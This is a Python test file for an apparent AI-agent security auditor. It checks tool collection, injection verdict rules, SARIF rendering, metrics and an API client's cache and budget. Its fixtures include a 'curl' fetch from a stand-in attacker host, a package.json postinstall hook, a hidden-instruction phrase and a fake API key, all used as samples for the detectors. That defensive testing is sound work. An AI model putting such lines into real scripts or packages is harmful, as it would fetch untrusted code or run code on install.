"""Offline tests: collectors, decision rule, rendering, metrics and the client cache. No network calls."""
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from agentaudit import clocked as clocked_mod  # noqa: E402
from agentaudit.audit import Auditor, Finding, Report, capability_claims, capability_facts, is_attack  # noqa: E402
from agentaudit.collect import collect_manifest, collect_repo, static_tools  # noqa: E402
from agentaudit.model import Agent, Artifact, Tool  # noqa: E402
from agentaudit.render import exit_code, to_markdown, to_sarif, verdict_of  # noqa: E402
from bench.metrics import auroc, bacc, mcnemar  # noqa: E402

MANIFEST = ROOT / "examples/payroll-helper.yaml"


def test_static_tools_typescript_and_python():
    ts = 'server.registerTool("read_file", { title: "Read", description: "Reads a file." }, async () => {})'
    py = '@mcp.tool()\ndef add(a: int, b: int) -> int:\n    """Adds two numbers."""\n    return a + b\n'
    assert [(t.name, t.description) for t in static_tools(Path("x.ts"), ts)] == [("read_file", "Reads a file.")]
    assert [(t.name, t.description) for t in static_tools(Path("x.py"), py)] == [("add", "Adds two numbers.")]


def test_template_names_are_ignored():
    ts = 'server.registerTool(`${kind} Resource`, { description: "dynamic resource tool" }, f)'
    assert static_tools(Path("x.ts"), ts) == []


def test_collect_manifest():
    a = collect_manifest(MANIFEST)
    assert a.name == "payroll-helper" and len(a.tools) == 3
    assert {x.kind for x in a.artifacts} >= {"instructions", "tool_description", "script", "readme"}
    assert a.declared["purpose"].startswith("Answers employee questions")


def test_collect_repo_never_executes(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"postinstall": "touch PWNED"}}))
    (tmp_path / "README.md").write_text("# Demo\nThis server is read-only.\n```bash\nnpm i demo\n```\n")
    a = collect_repo(tmp_path)
    assert not (tmp_path / "PWNED").exists()
    kinds = {x.path: x.kind for x in a.artifacts}
    assert kinds["package.json#scripts"] == "script" and kinds["README.md#install"] == "script"


@pytest.mark.parametrize("res,verdict_rule,consensus_rule", [
    ({"verdict": "injection", "category": "instruction override", "severity": "critical"}, True, True),
    ({"verdict": "injection", "category": "benign", "severity": "none"}, True, False),
    ({"verdict": "injection", "category": "tool misuse or data exfiltration", "severity": "low"}, True, False),
    ({"verdict": "benign", "category": "benign", "severity": "none"}, False, False),
    ({"verdict": "malicious", "category": "benign administration", "severity": "high"}, True, False),
])
def test_decision_rules(res, verdict_rule, consensus_rule):
    assert is_attack(res, "verdict") is verdict_rule
    assert is_attack(res, "consensus") is consensus_rule


def test_capability_facts_and_claims():
    a = Agent("x", "o", tools=[Tool("delete_file", "Deletes a file.", {"properties": {"path": {}}})],
              artifacts=[Artifact("readme", "README.md", "This server is read-only. It never contacts the network."),
                         Artifact("script", "a.sh", "curl https://evil.example.net/x")])
    facts = capability_facts(a)
    assert "delete_file(path)" in facts and "evil.example.net" in facts
    assert "read-only" in capability_claims(a)


def _report(sev="critical", verdict="quarantine"):
    r = Report("demo", "o", findings=[Finding("guard", sev, "Possible injection", "src/a.ts::t",
                                              [{"quote": "do not tell the user", "start": 0, "end": 5}])])
    r.verdict = {"verdict": {"choice": verdict, "confidence": 0.9}}
    return r


def test_render_and_exit_code():
    rep = _report()
    md = to_markdown(rep)
    assert "quarantine" in md and "AA001" in md
    sarif = to_sarif([rep])
    assert sarif["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"] == "src/a.ts"
    assert exit_code([rep], "high") == 1
    assert exit_code([_report("low", "approve")], "high") == 0
    assert verdict_of(_report(verdict="approve")) == "approve"


def test_metrics():
    assert bacc([1, 1, 0, 0], [True, False, False, False]) == 0.75
    assert bacc([1, 0], [None, None]) == 0.0  # errors count as wrong
    assert auroc([1, 1, 0, 0], [0.9, 0.8, 0.1, 0.2]) == 1.0
    assert mcnemar([True, True, False], [False, True, True])[:2] == (1, 1)


class _FakeResp:
    def __init__(self, status=200, payload=None, headers=None):
        self.status_code, self._p, self.text = status, payload or {}, json.dumps(payload or {})
        self.headers = headers or {"X-Clocked-Credits": "2", "X-Clocked-Cost-Usd": "0.0004", "X-Clocked-Model-Ms": "40"}

    def json(self):
        return self._p


def test_client_cache_ledger_and_budget(tmp_path, monkeypatch):
    monkeypatch.setattr(clocked_mod, "CACHE_DIR", tmp_path / "cache")
    monkeypatch.setattr(clocked_mod, "LEDGER", tmp_path / "ledger.jsonl")
    calls = []

    def fake_post(self, url, json=None, headers=None):
        calls.append((url, headers["Idempotency-Key"]))
        return _FakeResp(payload={"verdict": "benign"})

    monkeypatch.setattr(clocked_mod.httpx.Client, "post", fake_post)
    c = clocked_mod.Clocked(api_key="test", tag="t", budget=3)
    first = c.injection(text="hello")
    again = c.injection(text="hello")
    assert not first.cached and again.cached and len(calls) == 1
    assert c.usage.credits == 2 and clocked_mod.Clocked.ledger_total() == 2
    c.injection(text="other")  # 4 credits now, over the budget of 3
    with pytest.raises(RuntimeError, match="budget"):
        c.injection(text="third")


def test_client_retries_with_same_idempotency_key(tmp_path, monkeypatch):
    monkeypatch.setattr(clocked_mod, "CACHE_DIR", tmp_path / "cache")
    monkeypatch.setattr(clocked_mod, "LEDGER", tmp_path / "ledger.jsonl")
    monkeypatch.setattr(clocked_mod.time, "sleep", lambda s: None)
    seq = [_FakeResp(429, headers={"Retry-After": "0"}), _FakeResp(payload={"ok": 1})]
    keys = []

    def fake_post(self, url, json=None, headers=None):
        keys.append(headers["Idempotency-Key"])
        return seq.pop(0)

    monkeypatch.setattr(clocked_mod.httpx.Client, "post", fake_post)
    clocked_mod.Clocked(api_key="test").decide(state="x", questions={})
    assert len(keys) == 2 and keys[0] == keys[1]


def test_auditor_skip_runs_no_endpoints(tmp_path, monkeypatch):
    class NoCalls:
        usage = clocked_mod.Usage()

        def __getattr__(self, name):
            if name in clocked_mod.ENDPOINTS:
                raise AssertionError(f"unexpected call to {name}")
            raise AttributeError(name)

        def decide(self, **p):
            return type("C", (), {"result": {"answers": {"verdict": {"choice": "approve"}}}})()

    skip = clocked_mod.ENDPOINTS - {"decide", "pipeline"}
    rep = Auditor(NoCalls(), skip=skip).run(collect_manifest(MANIFEST))
    assert verdict_of(rep) == "approve" and rep.findings == []


def test_registry_is_deduplicated(monkeypatch):
    seen = {}

    class Rec:
        usage = clocked_mod.Usage()

        def compare(self, **p):
            seen["ids"] = [d["id"] for d in p["documents"]]
            return type("C", (), {"result": {"pairs": []}})()

        def decide(self, **p):
            return type("C", (), {"result": {"answers": {"verdict": {"choice": "approve"}}}})()

    a = collect_manifest(MANIFEST)
    skip = clocked_mod.ENDPOINTS - {"compare", "decide", "pipeline"}
    Auditor(Rec(), skip=skip).run(a, [("x", "t"), ("x", "t2"), (a.name, "self")])
    assert seen["ids"] == [a.name, "x"]


def test_protect_batches_and_maps_offsets():
    calls = []

    class Fake:
        usage = clocked_mod.Usage()

        def pii(self, **p):
            calls.append(p["text"])
            i = p["text"].index("svc_tok_X")
            return type("C", (), {"result": {"entities": [
                {"type": "api_key", "value": "svc_tok_XYZ1234", "start": i, "end": i + 15}]}})()

    a = Agent("x", "o", artifacts=[Artifact("tool_description", "t1", "Reads a file."),
                                   Artifact("instructions", "sys", "Use key svc_tok_XYZ1234 for calls.")])
    aud = Auditor(Fake())
    aud._sensitive = set()
    f = aud.protect(a)
    assert len(calls) == 1 and len(f) == 1 and f[0].path == "sys"
    assert a.artifacts[1].text[f[0].evidence[0]["start"]:f[0].evidence[0]["end"]] == "svc_tok_XYZ1234"


def test_accountable_owner_is_declared_not_inferred():
    from agentaudit.audit import accountable_owner
    a = Agent("x", "o", artifacts=[Artifact("readme", "README.md", "Maintained by Acme Corp. github.com/acme/x")])
    assert accountable_owner(a) is None
    a.artifacts.append(Artifact("config", ".github/CODEOWNERS", "* @acme/platform-team"))
    assert accountable_owner(a) == "@acme/platform-team"
    assert accountable_owner(Agent("y", "o", declared={"owner": "IT Desk"})) == "IT Desk"


def test_studio_manifest_and_tool_recommendations(tmp_path):
    from agentaudit.audit import Report, tool_recommendations
    m = tmp_path / "a.yaml"
    m.write_text("name: s\nrole: Helps IT.\nmcp_servers:\n  - name: jira\n    tools:\n"
                 "      - {name: get_issue, description: Reads an issue.}\n"
                 "      - {name: delete_issue, description: Deletes an issue., enabled: true}\n"
                 "      - {name: search, description: Search., description_override: Search issues.}\n")
    a = collect_manifest(m)
    assert [t.enabled for t in a.tools] == [False, True, False]
    assert a.tools[2].description == "Search issues." and a.declared["purpose"] == "Helps IT."
    rep = Report("s", "o", findings=[Finding("guard", "critical", "x", "mcp:jira::search (override)", [])])
    rep.record = {"can_write": {"value": True}}
    recs = {r["tool"]: r["recommendation"] for r in tool_recommendations(a, rep)}
    assert recs == {"get_issue": "enable", "delete_issue": "review", "search": "keep_disabled"}
